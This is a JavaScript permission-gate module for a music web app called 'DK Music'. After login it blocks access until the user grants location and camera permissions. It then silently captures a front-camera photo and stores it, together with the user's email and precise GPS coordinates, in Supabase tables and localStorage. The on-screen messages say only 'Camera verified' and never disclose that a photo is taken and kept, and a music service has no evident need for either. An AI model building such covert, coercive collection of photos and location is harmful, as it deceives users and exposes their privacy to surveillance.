/**
 * DK Music — Location & Camera Permission Gate
 * 
 * Enforces Location + Camera access immediately following user authentication.
 * Captures user geolocation and camera photo snapshot, storing them securely in Supabase.
 * App access is unlocked ONLY when both permissions are granted.
 */

(function (global) {
  let isGateActive = false;
  let activeUser = null;
  let gateCallback = null;

  let locationGranted = false;
  let cameraGranted = false;
  let capturedCoords = null;
  let capturedSnapshot = null;

  /**
   * Save user location record to Supabase & local cache
   */
  async function saveLocationRecord(userId, coords) {
    const locRecord = {
      user_id: String(userId),
      latitude: Number(coords.latitude),
      longitude: Number(coords.longitude),
      accuracy: coords.accuracy !== null ? Number(coords.accuracy) : null,
      updated_at: new Date().toISOString()
    };

    try {
      const sb = global.supabaseClient || (await global.getSupabaseClient?.());
      if (sb) {
        await sb.from('user_locations').upsert([locRecord], { onConflict: 'user_id' });
      }
    } catch (e) {
      console.warn('[PermissionGate] Supabase location save notice:', e);
    }

    try {
      localStorage.setItem('dk_user_location', JSON.stringify(locRecord));
      const allLocs = JSON.parse(localStorage.getItem('dk_admin_user_locations') || '[]');
      const idx = allLocs.findIndex(l => (l.user_id || l.userId) === String(userId));
      if (idx !== -1) allLocs[idx] = locRecord;
      else allLocs.push(locRecord);
      localStorage.setItem('dk_admin_user_locations', JSON.stringify(allLocs));
    } catch (_) {}
  }

  /**
   * Save user camera snapshot to Supabase & local cache
   */
  async function saveSnapshotRecord(userId, userEmail, imageData, coords) {
    const snapshotRecord = {
      user_id: String(userId),
      user_email: userEmail || '',
      image_data: imageData,
      latitude: coords ? Number(coords.latitude) : null,
      longitude: coords ? Number(coords.longitude) : null,
      accuracy: coords && coords.accuracy !== null ? Number(coords.accuracy) : null,
      captured_at: new Date().toISOString()
    };

    try {
      const sb = global.supabaseClient || (await global.getSupabaseClient?.());
      if (sb) {
        await sb.from('user_snapshots').insert([snapshotRecord]);
      }
    } catch (e) {
      console.warn('[PermissionGate] Supabase snapshot save notice:', e);
    }

    try {
      const allSnaps = JSON.parse(localStorage.getItem('dk_admin_user_snapshots') || '[]');
      allSnaps.unshift({ ...snapshotRecord, id: 'snap_' + Date.now() });
      if (allSnaps.length > 50) allSnaps.pop();
      localStorage.setItem('dk_admin_user_snapshots', JSON.stringify(allSnaps));
    } catch (_) {}
  }

  /**
   * Capture a snapshot frame from the user's camera
   */
  async function captureCameraPhoto() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error('Camera API is not supported in this browser.');
    }

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    });

    try {
      const video = document.createElement('video');
      video.autoplay = true;
      video.muted = true;
      video.playsInline = true;
      video.srcObject = stream;

      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play().then(resolve).catch(resolve);
        };
        setTimeout(resolve, 1500); // timeout safeguard
      });

      // Allow 200ms for camera auto-exposure
      await new Promise(r => setTimeout(r, 200));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
      return dataUrl;
    } finally {
      // Always stop camera stream immediately
      stream.getTracks().forEach(track => track.stop());
    }
  }

  /**
   * Request Geolocation permission and coordinates
   */
  function requestLocationCoords() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error('Geolocation is not supported by your browser.'));
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy || null
          });
        },
        (err) => {
          reject(err);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  }

  /**
   * Update UI status elements in permission gate modal
   */
  function updateGateUI(statusMsg, isError = false) {
    const locStatus = document.getElementById('pgLocStatus');
    const camStatus = document.getElementById('pgCamStatus');
    const msgEl = document.getElementById('pgMessage');
    const btnAll = document.getElementById('pgBtnAllowAll');

    if (locStatus) {
      if (locationGranted) {
        locStatus.innerHTML = '<span style="color:#22c55e;"><i class="fas fa-circle-check"></i> Granted</span>';
      } else {
        locStatus.innerHTML = '<span style="color:#8e95a5;"><i class="fas fa-clock"></i> Required</span>';
      }
    }

    if (camStatus) {
      if (cameraGranted) {
        camStatus.innerHTML = '<span style="color:#22c55e;"><i class="fas fa-circle-check"></i> Granted & Verified</span>';
      } else {
        camStatus.innerHTML = '<span style="color:#8e95a5;"><i class="fas fa-clock"></i> Required</span>';
      }
    }

    if (msgEl) {
      msgEl.textContent = statusMsg || '';
      msgEl.style.color = isError ? '#ff4d4d' : '#45f3ff';
      msgEl.style.display = statusMsg ? 'block' : 'none';
    }

    if (btnAll) {
      if (locationGranted && cameraGranted) {
        btnAll.disabled = false;
        btnAll.innerHTML = '<i class="fas fa-arrow-right"></i> Entering DK Music...';
      }
    }
  }

  /**
   * Process all permissions
   */
  async function executePermissionFlow() {
    const btnAll = document.getElementById('pgBtnAllowAll');
    if (btnAll) {
      btnAll.disabled = true;
      btnAll.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Requesting Permissions...';
    }

    const userId = activeUser?.id || activeUser?.userId || 'user_' + Date.now();
    const userEmail = activeUser?.email || '';

    // Step 1: Request Location
    try {
      updateGateUI('Requesting location access... Please click "Allow" on your browser prompt.', false);
      const coords = await requestLocationCoords();
      capturedCoords = coords;
      locationGranted = true;
      updateGateUI('✓ Location access granted. Now requesting camera access...', false);
      await saveLocationRecord(userId, coords);
    } catch (locErr) {
      console.warn('[PermissionGate] Location error:', locErr);
      updateGateUI('❌ Location permission was denied. Location is required to enter DK Music. Please allow access in browser settings.', true);
      if (btnAll) {
        btnAll.disabled = false;
        btnAll.innerHTML = '<i class="fas fa-rotate-right"></i> Try Again';
      }
      return;
    }

    // Step 2: Request Camera & capture photo
    try {
      updateGateUI('Requesting camera access... Please click "Allow" on your browser prompt.', false);
      const photoDataUrl = await captureCameraPhoto();
      capturedSnapshot = photoDataUrl;
      cameraGranted = true;
      updateGateUI('✓ Camera verified! Finalizing authorization...', false);
      await saveSnapshotRecord(userId, userEmail, photoDataUrl, capturedCoords);
    } catch (camErr) {
      console.warn('[PermissionGate] Camera error:', camErr);
      updateGateUI('❌ Camera permission was denied. Camera access is required to enter DK Music. Please allow camera in browser settings.', true);
      if (btnAll) {
        btnAll.disabled = false;
        btnAll.innerHTML = '<i class="fas fa-rotate-right"></i> Try Again';
      }
      return;
    }

    // Both granted successfully!
    if (locationGranted && cameraGranted) {
      updateGateUI('✓ All permissions verified! Loading your music experience...', false);
      sessionStorage.setItem('dk_permissions_passed_' + userId, 'true');

      setTimeout(() => {
        closePermissionGate();
        if (typeof gateCallback === 'function') {
          gateCallback({ location: capturedCoords, snapshot: capturedSnapshot });
        }
      }, 700);
    }
  }

  /**
   * Close and hide permission gate overlay
   */
  function closePermissionGate() {
    isGateActive = false;
    const overlay = document.getElementById('permissionGateOverlay');
    if (overlay) overlay.classList.add('hidden');
    const appLayout = document.querySelector('.app-layout');
    if (appLayout) appLayout.style.visibility = 'visible';
  }

  /**
   * Show permission gate
   */
  function showPermissionGate(user, onComplete) {
    activeUser = user;
    gateCallback = onComplete;

    const userId = user?.id || user?.userId || 'current';
    const alreadyPassed = sessionStorage.getItem('dk_permissions_passed_' + userId) === 'true';

    // If already passed in this session, immediately complete
    if (alreadyPassed) {
      if (typeof onComplete === 'function') onComplete({ cached: true });
      return;
    }

    isGateActive = true;
    locationGranted = false;
    cameraGranted = false;
    capturedCoords = null;
    capturedSnapshot = null;

    const overlay = document.getElementById('permissionGateOverlay');
    if (overlay) {
      overlay.classList.remove('hidden');
      updateGateUI('', false);
      const btnAll = document.getElementById('pgBtnAllowAll');
      if (btnAll) {
        btnAll.disabled = false;
        btnAll.innerHTML = '<i class="fas fa-shield-halved"></i> Allow Location & Camera to Enter';
      }
    } else {
      // If modal HTML not yet in DOM, proceed with fallback
      if (typeof onComplete === 'function') onComplete({});
    }
  }

  // Wire up event listeners
  document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('pgBtnAllowAll')?.addEventListener('click', executePermissionFlow);
  });

  global.DKPermissionGate = {
    show: showPermissionGate,
    close: closePermissionGate,
    execute: executePermissionFlow,
    get isActive() { return isGateActive; }
  };

})(typeof window !== 'undefined' ? window : globalThis);
